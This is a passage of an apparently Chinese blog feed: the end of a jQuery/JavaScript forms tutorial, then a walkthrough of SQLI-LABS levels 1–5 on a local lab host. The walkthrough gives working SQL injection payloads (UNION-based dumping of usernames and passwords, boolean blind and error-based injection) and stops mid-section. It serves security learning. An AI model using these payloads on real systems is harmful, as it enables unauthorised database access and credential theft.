<li>多选框  checkbox</li>
<li>隐藏域  hidden</li>
<li>密码框   password</li>
<li>……</li>
</ul>
<p>表单的目的：提交信息</p>
<blockquote>
<p>获得提交的信息</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>用户名： <span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--多选框的值就是定义好的value值--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>性别： <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;male&quot;</span> <span class="attr">id</span>=<span class="string">&quot;male&quot;</span>&gt;</span>男</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;radio&quot;</span> <span class="attr">name</span>=<span class="string">&quot;sex&quot;</span> <span class="attr">value</span>=<span class="string">&quot;female&quot;</span> <span class="attr">id</span>=<span class="string">&quot;female&quot;</span>&gt;</span>女</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> input_text = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;username&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> male_radio = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;male&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> female_radio = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;female&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="comment">//得到输入框的值</span></span></span><br><span class="line">    input_text.value;</span><br><span class="line"><span class="javascript">    <span class="comment">//修改输入框的值</span></span></span><br><span class="line"><span class="javascript">    input_text.value = <span class="string">&#x27;123&#x27;</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">    <span class="comment">//对于单选框。多选框等等固定的值，male_radio.value只能取到当前的值</span></span></span><br><span class="line"><span class="javascript">    male_radio.checked;  <span class="comment">//查看返回的结果，是否为true，如果为true，则被选中~</span></span></span><br><span class="line"><span class="javascript">    female_radio.checked = <span class="literal">true</span>; <span class="comment">//赋值</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>提交表单，md5加密密码，表单优化</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--表单绑定提交事件</span></span><br><span class="line"><span class="comment">onsubmit = 绑定一个提交检测的函数， true ，false</span></span><br><span class="line"><span class="comment">将这个结果返回给表单，使用 onsubmit 接收</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://www.baidu.com/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">onsubmit</span>=<span class="string">&quot;return aaa()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;input-password&quot;</span>  <span class="attr">required</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">id</span>=<span class="string">&quot;md5-password&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> uname = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;username&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;input-password&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> md5pwd = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;md5-password&#x27;</span>);</span></span><br><span class="line"></span><br><span class="line">        md5pwd.value = md5(pwd.value);</span><br><span class="line"><span class="javascript">        <span class="comment">//可以校验表单内容,true就是通过提交，false，阻止提交</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="literal">true</span>;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>


<h2 id="10、jQuery"><a href="#10、jQuery" class="headerlink" title="10、jQuery"></a>10、jQuery</h2><p>JavaScript </p>
<p>jQuery库，里面存在大量的 JavaScript 函数</p>
<blockquote>
<p>获取jQuery</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210209121658285.png" alt="image-20210209121658285"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    &lt;script crossorigin=&quot;anonymous&quot; integrity=&quot;sha512-WNLxfP/8cVYL9sj8Jnp6et0BkubLP31jhTG9vhL/F5uEZmg5wEzKoXp1kJslzPQWwPT1eyMiSxlKCgzHLOTOTQ==&quot; src=&quot;https://lib.baomitu.com/jquery/3.5.1/jquery.js&quot;&gt;&lt;/script&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.5.1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">公式：  $(selector).action()</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;test-jquery&quot;</span>&gt;</span>点我<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//选择器就是CSS的选择器</span></span></span><br><span class="line"><span class="javascript">    $(<span class="string">&#x27;#test-jquery&#x27;</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">&#x27;hello,jquery&#x27;</span>);</span></span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>选择器</p>
</blockquote>
<p><strong>$(selector).action()</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//原生js，选择器少，麻烦不好记</span></span><br><span class="line"><span class="comment">//标签选择器</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName();</span><br><span class="line"><span class="comment">//id选择器</span></span><br><span class="line"><span class="built_in">document</span>.getElementById();</span><br><span class="line"><span class="comment">//类选择器</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByClassName();</span><br><span class="line"></span><br><span class="line"><span class="comment">//jquery css 中的选择器，它全部都能用</span></span><br><span class="line">$(<span class="string">&#x27;p&#x27;</span>).click();  <span class="comment">//标签选择器</span></span><br><span class="line">$(<span class="string">&#x27;#id1&#x27;</span>).click();  <span class="comment">//id选择器</span></span><br><span class="line">$(<span class="string">&#x27;。class1&#x27;</span>).click();  <span class="comment">//类选择器</span></span><br></pre></td></tr></table></figure>
<p>文档工具站：<a class="link"   href="https://jquery.cuishifeng.cn/" >https://jquery.cuishifeng.cn/<i class="fas fa-external-link-alt"></i></a></p>
<blockquote>
<p>事件</p>
</blockquote>
<p>鼠标事件，键盘事件，其他事件</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210209145358043.png" alt="image-20210209145358043"></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jquery-3.5.1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-id">#divMove</span>&#123;</span></span><br><span class="line">            width: 500px;</span><br><span class="line">            height: 500px;</span><br><span class="line">            border: 1px solid red;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--要求：获取鼠标当前的坐标--&gt;</span></span><br><span class="line">mouse: <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;mouseMove&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divMove&quot;</span>&gt;</span></span><br><span class="line">    在这里移动鼠标试试</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="comment">/*当网页元素加载完毕之后，响应事件*/</span></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">&#x27;#divMove&#x27;</span>).mousemove(<span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            $(<span class="string">&#x27;#mouseMove&#x27;</span>).text(<span class="string">&#x27;x: &#x27;</span>+e.pageX + <span class="string">&#x27;y: &#x27;</span>+e.pageY)</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>操作 DOM</p>
</blockquote>
<p>节点文本操作</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#test-ul li[name=python]&#x27;</span>).text();		<span class="comment">//获得值</span></span><br><span class="line">$(<span class="string">&#x27;#test-ul li[name=python]&#x27;</span>).text(<span class="string">&#x27;123&#x27;</span>);	<span class="comment">//设置值</span></span><br><span class="line">$(<span class="string">&#x27;#test-ul&#x27;</span>).html();		<span class="comment">//获得值</span></span><br><span class="line">$(<span class="string">&#x27;#test-ul&#x27;</span>).html(<span class="string">&#x27;&lt;span&gt;123&lt;/span&gt;&#x27;</span>);		<span class="comment">//设置值</span></span><br></pre></td></tr></table></figure>
<p>CSS的操作</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#test-ul li[name=python]&#x27;</span>).css(<span class="string">&quot;color&quot;</span>,<span class="string">&quot;red&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>元素的显示和隐藏：本质 <code>display = none;</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#test-ul li[name=python]&#x27;</span>).show();	<span class="comment">//显示</span></span><br><span class="line">$(<span class="string">&#x27;#test-ul li[name=python]&#x27;</span>).hide();   <span class="comment">//隐藏</span></span><br></pre></td></tr></table></figure>
<p>娱乐测试</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="built_in">window</span>).width();</span><br><span class="line">$(<span class="built_in">window</span>).height();</span><br><span class="line">$(<span class="string">&#x27;#test-ul li[name=python]&#x27;</span>).toggle();</span><br></pre></td></tr></table></figure>


<p><strong>未来ajax()</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#form&#x27;</span>).ajax()</span><br></pre></td></tr></table></figure>




<blockquote>
<p>小技巧</p>
</blockquote>
<ol>
<li>如歌巩固JS （看 jQuery 原码，看游戏原码！）</li>
<li>巩固HTML，CSS（扒网站，全部 down 下来，然后对应修改看效果~）</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>SQLI-LABS (Basic Challenges) 1-20关</title>
    <url>/2021/03/07/SQLI-LABS%20(Basic%20Challenges)%201-20%E5%85%B3/</url>
    <content><![CDATA[<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><ul>
<li>首先判断数据类型和闭合方式，输入：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>会报错，证明我们时字符类型且闭合方式是<code>&#39;</code></p>
<ul>
<li>判断是否存在注入漏洞，输入：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; AND &#39;1&#39;&#x3D;&#39;1&#39;%23	正确</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; AND &#39;1&#39;&#x3D;&#39;2&#39;%23	报错</span><br></pre></td></tr></table></figure>
<p>证明此处存在注入漏洞</p>
<ul>
<li>利用order by查看返回的字段数</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order by 4%23</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303143837509.png" alt="image-20210303143837509"></p>
<p>输入1，2，3都能正常显示，当输入4的时候报错，证明查询返回的字段数为3</p>
<ul>
<li>查数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303144446362.png" alt="image-20210303144446362"></p>
<ul>
<li>查数据表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303144704182.png" alt="image-20210303144704182"></p>
<ul>
<li>查字段名</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303144842715.png" alt="image-20210303144842715"></p>
<ul>
<li>查数据</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password) from security.users--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303145126404.png" alt="image-20210303145126404"></p>
<h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><ul>
<li>判断是那种数据类型和闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;1	正确</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;2	报错</span><br></pre></td></tr></table></figure>
<p>从中可以判断该数据类型为数字型，剩下的利用方式和Less-1相同，只需把 <code>&#39;</code>去掉即可</p>
<h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>可以看出，闭合方式为 <code>(&#39;%id&#39;)</code> ，剩下的利用方式和Less-1相同，只需把 <code>&#39;</code>改成 <code>&#39;)</code>即可</p>
<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-4&#x2F;?id&#x3D;1&quot;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>可知闭合方式为<code>(&quot;$id&quot;)</code>，剩下的利用方式和Less-1相同，只需把 <code>&#39;</code>改成 <code>&quot;)</code>即可</p>
<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><ul>
<li>判断闭合方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;</span><br></pre></td></tr></table></figure>
<p>显示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</span><br></pre></td></tr></table></figure>
<p>可知闭合方式为<code>&#39;</code></p>
<ul>
<li>判断注入类型</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1	</span><br><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;-1</span><br></pre></td></tr></table></figure>
<p>这一关当我们输入正确的id时，显示<code>You are in...........</code>，当我们输入错误的id时，不会显示结果，可以判断，这里需要进行盲注。</p>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h4 id="使用-left-函数进行尝试"><a href="#使用-left-函数进行尝试" class="headerlink" title="使用 left() 函数进行尝试"></a>使用 left() 函数进行尝试</h4><ul>
<li>判断数据库版本的第一位是否是5</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND LEFT(version(),1)&#x3D;5--+</span><br></pre></td></tr></table></figure>
<ul>
<li>判断数据库长度</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND LENGTH(database())&#x3D;8--+</span><br></pre></td></tr></table></figure>
<ul>
<li>判断数据库名字的第一位</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND LEFT(database(),1)&gt;&#39;a&#39;--+</span><br></pre></td></tr></table></figure>
<p>Database()为 security，所以我们看他的第一位是否 &gt; a,很明显的是 s &gt; a,因此返回正确。当 我们不知情的情况下，可以用二分法来提高注入的效率。</p>
<ul>
<li>判断数据库名字的前两位</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND LEFT(database(),2)&gt;&#39;sa&#39;--+</span><br></pre></td></tr></table></figure>
<h4 id="使用-substr-和-ascii-函数进行尝试"><a href="#使用-substr-和-ascii-函数进行尝试" class="headerlink" title="使用 substr() 和 ascii() 函数进行尝试"></a>使用 substr() 和 ascii() 函数进行尝试</h4><ul>
<li>判断当前库的第一个表的表名的第一个字符是否为e</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1),1,1))&#x3D;101--+</span><br></pre></td></tr></table></figure>
<ul>
<li>判断当前库的第一个表的表名的第二个字符是否为m，只需使用 <code>substr(**,2,1)</code>即可.</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 0,1),2,1))&#x3D;109--+</span><br></pre></td></tr></table></figure>
<ul>
<li>判断当前库的第二个表的表名的第一个字符是否为r，只需使用 <code>limit 1,1</code>即可</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND ASCII(SUBSTR((SELECT table_name FROM information_schema.tables WHERE table_schema&#x3D;database() LIMIT 1,1),1,1))&#x3D;114--+</span><br></pre></td></tr></table></figure>
<h4 id="使用-regexp-进行尝试"><a href="#使用-regexp-进行尝试" class="headerlink" title="使用 regexp 进行尝试"></a>使用 regexp 进行尝试</h4><ul>
<li>选择 users 表中的列名是否有 us**的列</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND 1&#x3D;(SELECT 1 FROM information_schema.columns WHERE table_name&#x3D;&#39;users&#39; AND column_name regexp &#39;^us[a-z]&#39; LIMIT 0,1)--+</span><br></pre></td></tr></table></figure>
<ul>
<li>选择 users 表中的列名是否有 username 的列</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND 1&#x3D;(SELECT 1 FROM information_schema.columns WHERE table_name&#x3D;&#39;users&#39; AND column_name regexp &#39;^username&#39; LIMIT 0,1)--+</span><br></pre></td></tr></table></figure>
<p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在 无法判断的情况下，可以用 table_name regexp ‘^username$’来进行判断。^是从开头进行 匹配，$是从结尾开始判断。</p>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303163103856.png" alt="image-20210303163103856"></p>
<p>上图中可以看到 username 存在。我们可以将 username 换成 password 等其他的项也是正确 的。</p>
<h4 id="利用-ord（）和-mid（）函数获取-users-表的内容"><a href="#利用-ord（）和-mid（）函数获取-users-表的内容" class="headerlink" title="利用 ord（）和 mid（）函数获取 users 表的内容"></a>利用 ord（）和 mid（）函数获取 users 表的内容</h4><ul>
<li>获取 username 中的第一行的第一个字符的 ascii，与 68 进行比较， 即为 D。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND ORD(MID((SELECT username FROM security.users LIMIT 0,1),1,1))&#x3D;68--+</span><br></pre></td></tr></table></figure>
<p>而我们从表中得知第一行的数据为 Dumb。所以接下来只需要重复造轮子即可。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><ul>
<li>concat+rand()+group_by()导致主键重复</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.91.134&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; AND (select count(*) from information_schema.tables group by concat(user(),floor(rand(0)*2)))--+</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210303164415115.png" alt="image-20210303164415115"></p>
<ul>
<li>xpath语法错误</li>
</ul>
